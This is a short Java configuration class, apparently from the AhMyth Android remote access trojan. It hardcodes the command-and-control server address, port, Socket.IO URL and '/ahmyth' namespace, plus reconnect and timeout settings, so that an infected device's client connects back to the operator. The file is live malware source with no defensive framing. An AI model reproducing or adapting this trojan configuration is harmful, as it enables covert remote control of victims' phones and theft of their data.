package ahmyth.mine.king.ahmyth;

public class Config {
    public static final String IP = "192.168.195.247";
    public static final int PORT = 42474;
    public static final String SOCKET_IO_URL = "http://" + IP + ":" + PORT; // Server IP and Port
    public static final String SOCKET_IO_NAMESPACE = "/ahmyth";
    public static final int SOCKET_RECONNECT_INTERVAL = 5000; // 5 seconds
    public static final int SOCKET_TIMEOUT = 10000; // 10 seconds
} 